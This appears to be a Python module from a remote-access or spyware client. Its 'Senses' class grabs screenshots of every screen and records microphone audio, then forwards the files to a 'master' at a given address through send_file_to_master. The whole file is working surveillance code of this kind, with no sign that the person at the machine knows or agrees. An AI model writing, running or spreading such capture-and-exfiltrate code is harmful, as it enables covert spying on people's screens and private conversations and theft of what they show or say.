import io
import os
import time
from scipy.io.wavfile import write
import sounddevice as sd
from PIL import ImageGrab


class Senses:
    def __init__(self):
        # Does not need to create variables
        pass

    @staticmethod
    def see_screen(master, address):
        # Capture the screen state
        screenshot = ImageGrab.grab(include_layered_windows=True, all_screens=True)

        # Convert the screen state to PIL Image
        screen_state = screenshot.copy()

        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)

        # Convert the screen state image to bytes
        image_bytes = io.BytesIO()
        screen_state.save(image_bytes, format='PNG')
        image_bytes = image_bytes.getvalue()

        # Generate the file name
        file_name = f'screenshot_{timestamp}.png'

        # Send the file data to the master
        master.send_file_to_master(address, file_name, image_bytes)

    @staticmethod
    def hear_audio(master, address, duration=30):
        fs = 44100
        # Record audio
        print("Recording...")
        my_recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()  # Wait for the recording to finish:
        print("Recording completed")

        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M-%S", current_time)

        # Save the audio recording as a .wav file
        file_name = f"record_{timestamp}.wav"
        write(file_name, fs, my_recording)

        # Send the audio file to the master
        with open(file_name, 'rb') as f:
            audio_bytes = f.read()
        master.send_file_to_master(address, file_name, audio_bytes)
        print("Audio file sent to the master")

        # Remove the audio file
        os.remove(file_name)
